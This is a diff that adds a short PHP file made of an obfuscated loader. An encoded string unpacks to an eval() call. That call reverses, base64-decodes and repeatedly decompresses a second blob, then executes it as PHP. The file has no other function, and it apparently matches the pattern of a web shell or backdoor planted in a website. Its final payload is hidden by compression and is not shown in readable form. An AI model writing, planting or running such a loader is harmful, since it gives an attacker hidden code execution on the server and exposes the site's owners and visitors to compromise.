@@ -1,0 +1,7 @@
+<?php
+
+$unknown = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNHVrNDUlMjklMjklMjklMjklMjklMjklMjklMjklM0I=";
+$uk45 = "==wg2ZbvjkHlAMQf8qbJUmVxl9PHxdoddN7c2WaCLvdy9ysiyk3K/Y7xqlLN9Zdh191VRxj2koPL2xDdhjt6v0P9Gvyqnkdb0K9ml0McjO7SMpAEKOSjcZ4hGH0mNkfDa/FTa+MgQAMBZVKUkVf1x/Q4+ZjH0G3vxKrgGYBviM5SAuY8qJ9j8npzJ/XtqJzDc/USMkhCmZgTotC4ncdBY40+EVDaOYCFNhG8CS50oMKcrfOgzIM6GHU7VyuEQSb91RHnfpzVzkZ1ULrrFebJ75Pl3OA09CR0L7RQpMfa0iAcyuHYYXoAD+vB3XEEwMsaLDZfci3/QAw7BwJe/XAA6Hw/AAw/B4/+BQQA";
+eval/********/(htmlspecialchars_decode(urldecode(base64_decode($unknown))));
+exit;
+?>
